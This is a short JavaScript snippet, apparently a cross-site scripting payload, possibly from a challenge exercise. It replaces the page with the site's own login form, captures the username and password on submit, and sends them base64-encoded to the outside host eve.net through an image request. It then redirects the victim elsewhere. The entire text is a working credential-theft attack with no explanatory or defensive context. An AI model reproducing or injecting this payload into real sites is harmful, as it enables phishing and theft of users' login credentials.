document.write(await fetch('/login.php').then(r => r.text()) + `
  <script>
  setTimeout(() => $('form[action*=login]').submit(e => {
    e.preventDefault()
    c = e.currentTarget
    new Image().src = '//eve.net/' + btoa(c[0].value) + ':' + btoa(c[1].value)
    setTimeout(() => window.location = '/do-question.php?aaid=10972720', 1000)
  }), 4000)
  </script>
`)
